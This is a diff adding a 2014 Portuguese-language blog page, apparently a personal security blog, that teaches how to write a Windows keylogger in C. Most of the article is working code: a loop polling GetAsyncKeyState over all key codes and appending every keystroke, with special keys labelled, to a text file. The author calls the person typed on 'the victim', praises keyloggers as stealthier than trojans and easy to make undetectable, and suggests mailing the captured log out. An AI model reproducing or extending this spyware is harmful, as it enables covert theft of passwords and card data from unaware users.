@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Escrevendo Um Keylogger em C 0xc5</title>
+	
+	<meta name="author" content="mh4x0f">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/mh4x0f">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/mh4x0f">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:mh4root@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" />
+				
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" style="width:112px;height:112px;" />
+	</a>
+	<h3 class="title">
+        <a href="/"></a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	One 0x41414141 worth a thousand words
+</div>
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/mh4x0f">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/mh4x0f">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:mh4root@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<form class="col-lg-12" action="http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity" method="post" target="popupwindow" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity', 'popupwindow', 'scrollbars=yes,width=250,height=220');return true" >
+			<div class="input-group" style="width:240px;text-align:center;margin:0 auto;">
+			<input type="hidden" value="chmodsecurity" name="uri" >
+		  <input type="hidden" name="loc" value="pt_BR">
+		  <input  id="input-rss"  style="width:160px;text-align:center;" placeholder="Digite  seu e-mail" class="form-control input-lg" type="text" name="email">
+		  <span class="input-group-btn"><button id="btn-assinar" class="btn btn-lg btn-primary"  type="submit" value=" ASSINAR ">Assinar</button></span>
+	      </div>
+		</form>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Escrevendo Um Keylogger em C 0xc5 </h1>
+</div>
+	
+<article>
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   July 
+	   19th,
+	   
+	   2014
+	 </span>
+	  <div class="article_body">
+	  <p>Hi everybody!, in this article we gonna learn how to make a <a>keylogger in C</a>. isso mesmo um Keylooger existe muitos tutoriais que mostrar como fazer um keylogger mas aqui vamos ir além, vejo muita coisa por receita de bolo,"ai tu vem e cola o código aqui kkk", isso é foda, as vezes o cara até tem uma ideia de como funciona e quer aprimorar não sabe porque não sabe como funciona... por outro lado isso bom sabia ? apenas as pessoas que curti aprender coisas novas vão pesquisar e procurar entender o código. A um tempo atrás tentei criar um keylogger em assembly,foi um fracasso, na verdade até funcionou, talvez não tinha conhecimento suficiente para fazer algum mais complexo naquela época,em fim, Windows tudo é API, tudo mesmo. Believe! um Keylogger avançado bem feito mesmo não tem Trojans que bata nele, primeiro pelo fato que um trojan lógico tem mais opções de controle, mas o trojan causa muito barulho sem contar que pra ti achar um forense da vida pega fácil,e ainda traça tua Rede. sem contar que pra deixar indetectável um keylogger por usar menos funções que um trojan é bem fácil, esse KL(keylogger) vai ser simples porque precisamos entender o funcionamento para quem sabe futuramente você desenvolver um completo,eu tenho um aqui em c# e python avançado que talvez irei fazer um review deles com certeza o de Python vou fazer em breve, Let's Go.</p>
+<h3>O que é um keylogger ?</h3>
+<p>(wiki)  Key logger (que significa registrador do teclado em inglês) é um programa de computador do tipo spyware cuja finalidade é registrar tudo o que é digitado, quase sempre a fim de capturar senhas, números de cartão de crédito e afins.1 Muitos casos de phishing, assim como outros tipos de fraudes virtuais, se baseiam no uso de algum tipo de keylogger, instalado no computador sem o conhecimento da vítima, que captura dados sensíveis e os envia a um cracker que depois os utiliza para fraudes.</p>
+<p>Como eu já citei tudo no Rindows é API, vamos entender todo mundo sabe que o computador né ele não sabe letra nenhuma ou seja, tudo pra ele é número isso mesmo meu amigo até mesmo o sinal de  '-'(menos), e outra o processador só sabe fazer soma, isso mesmo talvez seja surpresa pra você tipo assim, 10 * 3, o processador trata isso com 10 + 10 + 10 = 30, em fim, não vamos perder o foco, há existe uma frag que fica ativa se o numero for negativo é assim que ele sabe se tiver ativa é  negativo se tiver desativa é positivo. As letras tudo são números olha só uma demostração:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="n">main</span> <span class="p">(){</span>
+     <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;%x, %x e %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="sc">&#39;B&#39;</span><span class="p">,</span> <span class="sc">&#39;C&#39;</span><span class="p">);</span> 
+ <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+
+<p>———————— Resultado:
+41, 42 e 43</p>
+<p>é assim que funciona, não tou falando de um KL, pois a API vai fazer isso tudo automaticamente pela tabela ASCII, tabela muito famosa quiser dar uma olhada lá, São os valores em HEX, outra coisa link da tabela: http://www.asciitable.com/index/asciifull.gif. se quiser converter de HEX para CHAR no lugar do %x usaremos o %c olha só como fica:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="n">main</span> <span class="p">(){</span>
+     
+     <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;%c, %c e %c</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">);</span>
+ <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="p">}</span></code></pre></div>
+
+<p>Vamos falar da nossa API, responsável por capturar as teclas digitadas esse cara é <a>GetAsyncKeyState</a> é uma função que retorna um bit significativo, se nós olharmos no MSDN vamos veja assim precisa passa apenas um parâmetro como demostrado abaixo. outra coisa teclas como Ctrl,Shift e entre outras temos que tratar a saídas delas você verá abaixo alguns exemplos:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="o">-------------</span><span class="n">API</span><span class="o">---------------------</span>
+<span class="n">SHORT</span> <span class="n">WINAPI</span> <span class="n">GetAsyncKeyState</span><span class="p">(</span>
+  <span class="n">_In_</span>  <span class="kt">int</span> <span class="n">vKey</span>
+<span class="p">);</span>
+<span class="o">-------------------------------------</span>
+<span class="n">Code</span>	        <span class="n">Meaning</span>
+<span class="n">VK_LSHIFT</span>	<span class="n">Left</span><span class="o">-</span><span class="n">shift</span> <span class="n">key</span><span class="p">.</span>
+<span class="n">VK_RSHIFT</span>	<span class="n">Right</span><span class="o">-</span><span class="n">shift</span> <span class="n">key</span><span class="p">.</span>
+<span class="n">VK_LCONTROL</span>	<span class="n">Left</span><span class="o">-</span><span class="n">control</span> <span class="n">key</span><span class="p">.</span>
+<span class="n">VK_RCONTROL</span>	<span class="n">Right</span><span class="o">-</span><span class="n">control</span> <span class="n">key</span><span class="p">.</span>
+<span class="n">VK_LMENU</span>	<span class="n">Left</span><span class="o">-</span><span class="n">menu</span> <span class="n">key</span><span class="p">.</span>
+<span class="n">VK_RMENU</span>	<span class="n">Right</span><span class="o">-</span><span class="n">menu</span> <span class="n">key</span><span class="p">.</span></code></pre></div>
+
+<p>Essas teclas e mais algumas teremos que trata-la caso a vitima pressione vamos adiciona olha a vitima apertou tal tecla para não ficar o código deles precisamos fazer isso você vai entender melhor ao longo do artigo. o valor de return que essa função nós dar é do tipo SHORT (Se a função tiver êxito, o valor de retorno especifica se a tecla foi pressionada desde a última chamada para GetAsyncKeyState , e se a chave está atualmente para cima ou para baixo. Se o bit mais significativo é definido, a chave está em baixo, e se o bit menos significativo é definido, a tecla foi pressionada após a chamada anterior para GetAsyncKeyState . No entanto, você não deve contar com este último comportamento; Para mais informações, consulte os comentários).se esse cara é do tipo SHORT então precisamos criar duas variáveis do tipo claro né uma vai contar e a outra vai comparar caso a função a função retorne -32767 fica tipo assim:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">short</span> <span class="n">i</span><span class="p">;</span>                                               <span class="c1">// contador </span>
+    <span class="kt">short</span> <span class="n">keyState</span><span class="p">;</span>                                 <span class="c1">//comprar a letra digitada</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>                                           <span class="c1">//tratamento </span>
+        <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>                <span class="c1">// renge vai até 255 </span>
+            <span class="n">keyState</span> <span class="o">=</span> <span class="n">GetAsyncKeyState</span><span class="p">(</span><span class="n">i</span><span class="p">);</span> <span class="c1">// copia o valor do caracter digitado para a nossa variável KeyState</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">keyState</span> <span class="o">==</span> <span class="o">-</span><span class="mi">32767</span><span class="p">)</span> <span class="p">{</span>            <span class="c1">// Compara se a tecla digitada é igual a -32767</span></code></pre></div>
+
+<p> Vamos para explicação primeiro comentei tudo fica mais fácil, mas vamos ver porque a função GetAsyncKeyState() retorna -32767 caso a tecla pressionada for verdade, isso acontece porque o bit significativo que é retornado da função  GetAsyncKeyState() são dois tipos booleanos ou é verdadeiro ou falso, mas não assim: True and False, o valor retornado é  0x8000 caso for True, ou seja, se ele voltar 0x8000 quer dizer que alguma tecla foi digitada o que temos que fazer é comprar ver se foi digitada e salvar em um arquivo vou fazer mais uma demo como seria:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">if</span><span class="p">(</span><span class="n">GetAsyncKeyState</span><span class="p">(</span><span class="sc">&#39;c&#39;</span><span class="p">)</span><span class="o">==-</span><span class="mi">32767</span><span class="p">)</span>
+ <span class="p">{</span>
+ <span class="n">printf</span><span class="p">(</span><span class="s">&quot;A tecla  &#39;c&#39; foi pressionada :D);</span>
+<span class="p">}</span></code></pre></div>
+
+<p>Entendeu?, então caso a tecla não for pressionada vai voltar 0x8001(que convertando de hex para decimal = 37769), já o 0x800 = a 37768, mas não precisamos tratar isso né claro queremos pegar apenas as teclas pressionada, detalhe:Há 2 ^ 16 = 65.536 possíveis números de 16 bits, portanto, um número de 16 bits só pode representar um de uma série de 65536 números consecutivos. Para permitir que os números positivos e negativos, muitos sistemas de computação e linguagens de programação usar uma variedade de -32767 a 32768.  Como o menor número no intervalo, pode ser o padrão para quando nenhuma tecla é pressionada. há não falei dos Hearders a função GetAsyncKeyState() está na biblioteca <a>Windows.h</a>  e  #include <stdio.h> pra da printf; vamos continuar nosso código:
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">keyState</span> <span class="o">=</span> <span class="n">GetAsyncKeyState</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>                                     <span class="c1">// já sabemos :D  </span>
+            <span class="k">if</span><span class="p">(</span><span class="n">keyState</span> <span class="o">==</span> <span class="o">-</span><span class="mi">32767</span><span class="p">)</span> <span class="p">{</span>                                                   <span class="c1">// novamente compra se a captura de teclas começou </span>
+                <span class="n">Sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">);</span>                                                                     
+                <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>                                                                      <span class="c1">// cria um variável do tipo file(arquivo)</span>
+                <span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;C:/Users/Marcos/Desktop/test.txt&quot;</span><span class="p">,</span> <span class="s">&quot;a+&quot;</span><span class="p">);</span>  <span class="c1">// salva tudo que é digitado em um arquivo txt(GetCurrentDirectory mas to com preguiça)</span>
+ 
+                <span class="k">if</span><span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>                                                           <span class="c1">// se na criação do arquivo deu algum erro NULL, ai sai do meu keylogger</span>
+                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Opah, Erro ao criar o arquivo.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+                    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>                                                                      <span class="c1">// sai fora do programa :D </span>
+                <span class="p">}</span></code></pre></div>
+
+<p> A unica coisa importante dessa parte do código é a criação de um file() para salvar o que foi digitado em um arquivo txt, nada de mais o resto meu amigo é C básico claro você como programador não vai colocar o caminho do arquivo, usa GetCurrentDirectory fica mais dinâmico deixei isso com você. calma estamos terminando já:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">switch</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">case</span> <span class="nl">VK_SPACE</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_SHIFT</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[SHIFT]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_RETURN</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[ENTER]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_BACK</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[BACKSPACE]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_TAB</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[TAB]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_CONTROL</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[CTRL]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_DELETE</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[DEL]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_1</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[;:]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_2</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[/?]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_3</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[`~]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_4</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[ [{ ]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_5</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[</span><span class="se">\\</span><span class="s">|]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_6</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[ ]} ]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_7</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[&#39;</span><span class="se">\&quot;</span><span class="s">]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="mi">187</span><span class="o">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;+&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="mi">188</span><span class="o">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="mi">189</span><span class="o">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;-&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="mi">190</span><span class="o">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD0</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;0&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD1</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;1&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD2</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;2&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD3</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;3&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD4</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;4&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD5</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;5&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD6</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;6&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD7</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;7&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD8</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;8&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD9</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;9&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_CAPITAL</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[CAPS LOCK]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">default</span><span class="o">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+
+<p>Código pra caralho né, é assim mesmo quer pouca linha vá programar em python :D, isso em python até meu primo de 7 anos faz,(pyhook) tou ensinando lógica programação pra ele kkkk,, podemos fazer algum mais louco em python como enviar esse arquivo com as teclas por email (pensamento Blackhat), ou FTP, claro da pra fazer até tirar screenshot quando começar a digitar e enviar por email, em fim várias possibilidades. vou explicar essa parte até porque não comentei nada, mas da pra entender né, é apenas um <a>switch</a> e uma cacetada de Case pra dentro, primeiro precisamos verificar algumas teclas claro temos que tratar tudo pra não ficar código no meio de caracter ai nosso keylogger vai ficar feio não queremos isso, podemos fazer isso com menos código ? sim claro depois vou colocar abaixo, mas vamos usar outras funções, lembre-se sempre esse artigo é didático mano, em breve vamos fazer algum para blackhat mesmo , como falei mas é preciso antes disso ter o knowledge.essa função é muito usada no desenvolvimento de Jogos, veja que os tratamento vai de função para função caso o cara digite 'CAPS LOCK'  na GetAsyncKeyState function vai voltar VK_CAPITAL, então nós gravamos no arquivo como CAPS LOCK claro, e por ai vai números também a mesma coisa. ainda mais o Espaço  que é o primeiro a ser tratado lá em cima. então isso é tudo pessoal:</p>
+<img src="https://dl.dropboxusercontent.com/u/97321327/keylogger1.png" />
+
